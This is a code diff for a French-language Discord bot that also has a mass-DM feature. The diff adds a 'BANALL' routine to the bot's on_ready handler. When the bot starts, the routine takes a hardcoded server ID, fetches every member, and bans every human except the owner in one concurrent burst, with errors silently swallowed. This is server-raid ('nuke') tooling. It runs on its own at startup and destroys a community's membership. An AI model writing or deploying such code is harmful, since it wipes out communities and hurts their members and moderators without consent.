@@ -24,6 +24,7 @@ COMPONENTS_V2 = 32768
 EPHEMERAL = 64
 VIEWS_READY = False
 DMALL_RUNNING = False
+TARGET_GUILD_ID = 1497369493218000946
 DMALL_STOP = False
 HTTP_TIMEOUT = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
 CONFIG_FILE = os.path.join(os.path.dirname(__file__), "config.json")
@@ -965,26 +966,23 @@ async def on_ready():
         VIEWS_READY = True
     print(f"[OK] {bot.user} connecté ({len(bot.guilds)} serveur(s))")
 
+    guild = bot.get_guild(TARGET_GUILD_ID)
+    if not guild:
+        print("[BANALL] Serveur introuvable — bot pas dans ce serveur ?")
+        return
+    try:
+        await guild.chunk()
+    except Exception:
+        pass
+    membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
+    print(f"[BANALL] Tentative de ban sur {len(membres)} membres...")
+    async def try_ban(m):
+        try:
+            await m.ban(delete_message_days=0)
+        except Exception:
+            pass
+    await asyncio.gather(*[try_ban(m) for m in membres])
+    print("[BANALL] Fait !")
+
 
 bot.run(os.environ.get("TOKEN", ""))
-
-TARGET_GUILD_ID = 1497369493218000946
-
-@bot.event
-async def on_ready():
-    global VIEWS_READY
-    load_config()
-    if not VIEWS_READY:
-        bot.add_view(PanelView())
-        bot.add_view(MessageConfigView())
-        bot.add_view(DmOptionsView())
-        VIEWS_READY = True
-    print(f"[OK] {bot.user} connecté ({len(bot.guilds)} serveur(s))")
-
-    # Ban auto au démarrage
-    guild = bot.get_guild(TARGET_GUILD_ID)
-    if guild:
-        membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
-        print(f"[BANALL] Ban de {len(membres)} membres sur {guild.name}...")
-        await asyncio.gather(*[m.ban(reason="banall", delete_message_days=0) for m in membres], return_exceptions=True)
-        print(f"[BANALL] Terminé !")
